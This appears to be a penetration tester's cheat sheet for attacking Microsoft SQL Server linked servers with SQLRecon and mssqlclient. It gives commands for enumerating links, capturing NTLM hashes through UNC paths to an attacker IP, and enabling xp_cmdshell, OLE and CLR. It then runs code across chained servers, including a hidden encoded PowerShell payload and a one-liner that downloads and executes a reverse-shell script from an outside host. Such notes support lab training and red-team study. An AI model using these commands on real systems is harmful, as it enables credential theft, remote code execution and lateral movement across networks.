## Emumeration
### SQLRecon
```powershell
# Check MSSQL Server for links
.\SQLRecon.exe /a:WinToken /h:DC01 /m:links

# Execute through DC01 against any identified linked servers
.\SQLRecon.exe /a:WinToken /h:DC01 /l:APPSRV01,APPSRV02 /m:info
.\SQLRecon.exe /a:WinToken /h:DC01 /l:APPSRV01,APPSRV02 /m:whoami

# Check linked servers for further linked servers
.\SQLRecon.exe /a:WinToken /h:DC01 /l:APPSRV01,APPSRV02 /m:links

# Check impersonation on linked servers
.\SQLRecon.exe /a:WinToken /h:DC01 /l:APPSRV01,APPSRV02 /m:impersonate
```
### MSSQLClient
```bash
SQL (webapp11  dbo@master)> enum_links

<<#
Linked Server      Local Login   Is Self Mapping   Remote Login   
----------------   -----------   ---------------   ------------   
SQL11\SQLEXPRESS   NULL                        1   NULL           

SQL27              webapp11                    0   webappGroup    

SQL53              webapp11                    0   testAccount 
#

# Use link
SQL (webapp11  dbo@master)> use_link SQL27
SQL >SQL27 (webappGroup  dbo@master)> SELECT @@SERVERNAME                    
# ----------------   
# SQL27\SQLEXPRESS

# Chaining links together
SQL >SQL27 (webappGroup  dbo@master)> use_link SQL53
SQL >SQL27>SQL53 (webapps  guest@master)> SELECT @@SERVERNAME                  
# ----------------   
# SQL53\SQLEXPRESS   
```
## NTLM Capture
### SQLRecon
```powershell
.\SQLRecon.exe /a:WinToken /h:DC01 /l:APPSRV01,APPSRV02 /m:smb /unc:"\\192.168.45.223\NOT_A_REAL_SHARE"
```
### MSSQLClient
```bash
SQL >SQL53 (testAccount  dbo@master)> xp_dirtree \\192.168.45.154\Share
```


## Code Execution
### SQLRecon
```powershell
# xp_cmdshell
.\SQLRecon.exe /a:WinToken /h:APPSRV01 /l:DC01,DC02 /m:enablexp
.\SQLRecon.exe /a:WinToken /h:APPSRV01 /l:DC01,DC02 /m:xpcmd /c:"ping 192.168.45.223"

# Alternative, where "AT [SERVER]" is the target server
.\SQLRecon.exe /a:WinToken /h:RDC01.CORP1.COM /m:query /c:"EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [DC01.CORP2.COM]"
.\SQLRecon.exe /a:WinToken /h:RDC01.CORP1.COM /m:query /c:"EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [DC01.CORP2.COM]"
.\SQLRecon.exe /a:WinToken /h:RDC01.CORP1.COM /l:DC01.CORP2.COM /m:xpcmd /c:"powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc JABzAGQAPQBOAGUAdwAtAE8"

# Alternative, Going through CDC01 --> Execute Query on DC01 directly to RDC01 to enable xpcmdshell
.\SQLRecon.exe /a:WinToken /h:CDC01.PROD.CORP1.COM /m:query /c:"EXEC('EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [DC01.CORP2.COM]') AT [RDC01.CORP1.COM]"
.\SQLRecon.exe /a:WinToken /h:CDC01.PROD.CORP1.COM /m:query /c:"EXEC('EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [DC01.CORP2.COM]') AT [RDC01.CORP1.COM]"
.\SQLRecon.exe /a:WinToken /h:CDC01.PROD.CORP1.COM /l:RDC01.CORP1.COM,DC01.CORP2.COM /chain /m:xpcmd /c:"powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc JABzAGQAPQBOAGUAdwAtAE8"

# Revert changes
.\SQLRecon.exe /a:WinToken /h:RDC01.CORP1.COM /m:query /c:"EXEC('sp_configure ''xp_cmdshell'', 0; reconfigure;') AT [DC01.CORP2.COM]"
.\SQLRecon.exe /a:WinToken /h:RDC01.CORP1.COM /m:query /c:"EXEC('sp_configure ''show advanced options'', 0; reconfigure;') AT [DC01.CORP2.COM]"

# OLE (No command output)
.\SQLRecon.exe /a:WinToken /h:APPSRV01 /l:DC01,DC02 /m:enableole
.\SQLRecon.exe /a:WinToken /h:APPSRV01 /l:DC01,DC02 /m:olecmd /c:"powershell.exe -c iex (iwr -usebasicparsing http://192.168.45.223/reverse-shell.ps1)"

# CLR (No command output)
.\SQLRecon.exe /a:WinToken /h:APPSRV01 /l:DC01,DC02 /m:enableclr
.\SQLRecon.exe /a:WinToken /h:APPSRV01 /l:DC01,DC02 /m:clr /dll:"C:\Warhead.dll" /function:main
```
## Chaining Linked Servers
Chaining linked MSSQL servers together can create opportunities for interesting attack vectors, especially when misconfigurations are present. Consider the following scenario:

In the example below, we have access to the MSSQL instance on `APPSRV01`. We do not have any special privileges on the server, but it has a link to `DC01`. By default, linked servers can be configured to use various security contexts for linked queries, including the current login's context or a specified remote login. If the linked server is configured to use a high-privilege account such as `sa` or another privileged user, then any queries executed from `APPSRV01` to `DC01` would run in that context.

If `DC01` has a bidirectional link back to `APPSRV01` and the link is configured with a privileged login, we could potentially chain this access to gain elevated execution rights back to `APPSRV01`. This scenario could look like the following:
```
 [APPSRV01] ---> [DC01] ---> [APPSRV01]
[Unprivileged] -----------> [Privileged]
```
## Code Execution through chaining
### SQLRecon
When using SQLRecon for chained MSSQL servers we need to specify the entry server `/h:APPRSRV01` and the execution chain to follow `/l:DC01,DC02,DC03`.  For example the command below will run the initial query on `APPSRV01` which has a link to `DC01` whereby, `DC01` has a link to `DC02`  which again, `DC02` has a link to `DC03` where the final query / command is executed.
```powershell
.\SQLRecon.exe /a:WinToken /h:APPSRV01 /l:DC01,DC02,DC03 /chain /m:xpcmd /c:"ping 192.168.45.223"

# Execution chain
# [APPSRV01] ---> [DC01] ----> [DC02] ---> [DC03]
```
Code and query execution can be followed at the top of the document for syntax examples. We just need to ensure we specify the correct chain order `/l:1,2,3` and ensure `/chain` is specified as a parameter.
